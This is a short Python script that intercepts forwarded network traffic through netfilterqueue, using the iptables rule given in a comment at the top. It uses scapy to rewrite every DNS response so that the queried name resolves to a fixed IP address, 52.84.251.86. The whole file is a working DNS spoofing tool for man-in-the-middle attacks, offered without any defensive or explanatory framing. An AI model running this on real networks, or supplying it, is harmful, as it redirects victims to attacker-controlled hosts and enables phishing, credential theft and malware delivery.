#!/usr/bin/env python
# iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy

def process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR) and scapy_packet.haslayer(scapy.UDP):
        print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        print("[+] SPOOFING TARGET...")
        answer = scapy.DNSRR(rrname=qname, rdata="52.84.251.86")
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len
        packet.set_payload(str(scapy_packet))
        print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process)
queue.run()

